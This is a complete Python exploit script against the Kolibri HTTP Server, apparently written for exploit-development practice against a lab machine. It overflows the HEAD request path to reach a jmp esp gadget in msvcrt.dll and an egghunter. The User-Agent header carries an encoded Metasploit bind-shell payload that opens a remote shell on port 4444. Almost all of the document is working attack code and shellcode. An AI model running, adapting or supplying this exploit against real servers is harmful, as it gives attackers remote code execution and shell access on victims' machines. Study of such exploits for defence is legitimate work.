#!/usr/bin/python

import socket
import os
import sys

banner = """
#----------------------------------------------#
Kolibri HTTP Server Exploit - Egghunter
#----------------------------------------------#
"""

print banner

#Egghunter
#Size 32-bytes
#use mona -> !mona egg -t b33f -> "b33fb33f"
hunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x62\x33" #b3
"\x33\x66\x8b\xfa" #3f
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=192.168.37.131 LPORT=4444 -e x86/alpha_mixed -f c
shellcode = ("\x89\xe6\xda\xcc\xd9\x76\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x5a\x48\x6c\x42\x67\x70\x43\x30\x55\x50\x51\x70\x4d"
"\x59\x5a\x45\x44\x71\x4f\x30\x70\x64\x6e\x6b\x42\x70\x76\x50"
"\x6c\x4b\x71\x42\x54\x4c\x6c\x4b\x43\x62\x75\x44\x6e\x6b\x32"
"\x52\x64\x68\x64\x4f\x6f\x47\x43\x7a\x35\x76\x70\x31\x39\x6f"
"\x4e\x4c\x75\x6c\x33\x51\x53\x4c\x67\x72\x46\x4c\x45\x70\x7a"
"\x61\x6a\x6f\x64\x4d\x73\x31\x6a\x67\x78\x62\x78\x72\x42\x72"
"\x36\x37\x6c\x4b\x43\x62\x36\x70\x4e\x6b\x50\x4a\x35\x6c\x4e"
"\x6b\x70\x4c\x77\x61\x51\x68\x58\x63\x61\x58\x33\x31\x5a\x71"
"\x30\x51\x4e\x6b\x72\x79\x57\x50\x55\x51\x48\x53\x6c\x4b\x31"
"\x59\x72\x38\x38\x63\x35\x6a\x57\x39\x6c\x4b\x74\x74\x4e\x6b"
"\x45\x51\x6a\x76\x66\x51\x59\x6f\x6e\x4c\x5a\x61\x58\x4f\x44"
"\x4d\x67\x71\x79\x57\x66\x58\x79\x70\x31\x65\x5a\x56\x53\x33"
"\x63\x4d\x7a\x58\x37\x4b\x53\x4d\x55\x74\x50\x75\x6a\x44\x63"
"\x68\x4e\x6b\x32\x78\x44\x64\x55\x51\x39\x43\x35\x36\x4e\x6b"
"\x54\x4c\x52\x6b\x6e\x6b\x50\x58\x45\x4c\x33\x31\x5a\x73\x6c"
"\x4b\x35\x54\x6e\x6b\x37\x71\x68\x50\x6c\x49\x62\x64\x65\x74"
"\x35\x74\x43\x6b\x53\x6b\x30\x61\x56\x39\x71\x4a\x33\x61\x4b"
"\x4f\x79\x70\x51\x4f\x31\x4f\x63\x6a\x6e\x6b\x45\x42\x6a\x4b"
"\x4e\x6d\x61\x4d\x63\x58\x67\x43\x65\x62\x53\x30\x53\x30\x73"
"\x58\x50\x77\x30\x73\x35\x62\x31\x4f\x52\x74\x30\x68\x62\x6c"
"\x74\x37\x51\x36\x66\x67\x49\x6f\x4e\x35\x6e\x58\x6c\x50\x66"
"\x61\x57\x70\x73\x30\x55\x79\x38\x44\x31\x44\x62\x70\x52\x48"
"\x47\x59\x6d\x50\x62\x4b\x37\x70\x49\x6f\x58\x55\x63\x5a\x36"
"\x68\x73\x69\x36\x30\x58\x62\x59\x6d\x33\x70\x30\x50\x77\x30"
"\x50\x50\x61\x78\x48\x6a\x76\x6f\x39\x4f\x49\x70\x39\x6f\x38"
"\x55\x4c\x57\x55\x38\x64\x42\x73\x30\x47\x61\x33\x6c\x6e\x69"
"\x6b\x56\x43\x5a\x54\x50\x51\x46\x32\x77\x32\x48\x68\x42\x69"
"\x4b\x50\x37\x61\x77\x59\x6f\x69\x45\x51\x47\x31\x78\x68\x37"
"\x4d\x39\x66\x58\x4b\x4f\x69\x6f\x58\x55\x71\x47\x71\x78\x43"
"\x44\x38\x6c\x37\x4b\x68\x61\x59\x6f\x38\x55\x30\x57\x7a\x37"
"\x30\x68\x63\x45\x72\x4e\x50\x4d\x55\x31\x79\x6f\x4e\x35\x72"
"\x48\x33\x53\x32\x4d\x52\x44\x55\x50\x6d\x59\x39\x73\x50\x57"
"\x70\x57\x46\x37\x30\x31\x38\x76\x73\x5a\x57\x62\x36\x39\x76"
"\x36\x68\x62\x59\x6d\x50\x66\x49\x57\x47\x34\x45\x74\x35\x6c"
"\x53\x31\x65\x51\x6c\x4d\x37\x34\x71\x34\x52\x30\x6f\x36\x53"
"\x30\x50\x44\x32\x74\x76\x30\x63\x66\x46\x36\x51\x46\x37\x36"
"\x73\x66\x30\x4e\x76\x36\x30\x56\x76\x33\x33\x66\x33\x58\x72"
"\x59\x58\x4c\x47\x4f\x6d\x56\x6b\x4f\x78\x55\x4b\x39\x39\x70"
"\x70\x4e\x36\x36\x71\x56\x49\x6f\x50\x30\x52\x48\x74\x48\x4e"
"\x67\x47\x6d\x45\x30\x49\x6f\x39\x45\x4d\x6b\x7a\x50\x68\x35"
"\x4e\x42\x62\x76\x43\x58\x6e\x46\x6c\x55\x6d\x6d\x4f\x6d\x6b"
"\x4f\x39\x45\x47\x4c\x45\x56\x61\x6c\x54\x4a\x4f\x70\x39\x6b"
"\x79\x70\x52\x55\x43\x35\x6f\x4b\x62\x67\x52\x33\x64\x32\x52"
"\x4f\x72\x4a\x35\x50\x31\x43\x69\x6f\x6a\x75\x41\x41"
)

#jmp esp added from 0x77c35459 from msvcrt.dll and jump back 60
Stage1 = "A"*478 + hunter + "A"*5 + "\x59\x54\xC3\x77" + "\xEB\xC4"
#hunter + shellcode
Stage2 = "b33fb33f" + shellcode

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 192.168.37.131:8080\r\n"
"User-Agent: " + Stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.37.131", 8080))
expl.send(buffer)

launchsploit = """
#----------------------------------------------#
Kolibri Exploit Launched
#----------------------------------------------#
"""

print launchsploit

expl.close()
